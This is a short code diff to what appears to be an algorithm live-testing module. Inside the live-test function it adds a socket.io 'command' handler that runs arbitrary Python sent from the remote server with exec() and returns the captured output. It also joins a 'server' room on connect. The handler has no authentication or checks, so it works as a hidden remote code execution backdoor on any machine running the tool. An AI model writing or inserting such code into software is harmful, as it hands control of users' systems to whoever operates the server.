@@ -16,6 +16,9 @@ from traceback import print_exc
 
 from ._WindowsInhibitor import WindowsInhibitor
 
+from io import StringIO
+from contextlib import redirect_stdout
+
 def livetest_algorithm(self):
     """
     this function live tests algorithms 
@@ -38,9 +41,23 @@ def livetest_algorithm(self):
         @self.sio.event
         async def message(data):
             print(data)
+
+        @self.sio.event
+        async def command(data,self=self):
+            if data.get('command'):
+                command = data.get('command')
+                f = StringIO()
+                with redirect_stdout(f):
+                    exec(command)
+                to_return = f.getvalue()
+
+                await self.sio.emit('command', {'response': to_return, 'client': data.get('client')})
+        
         @self.sio.event
         async def connect():
             print('i am connected')
+            await self.sio.emit('join', {'room': 'server'})
+
         @self.sio.event
         async def connect_error(data):
             print('The connection Failed')
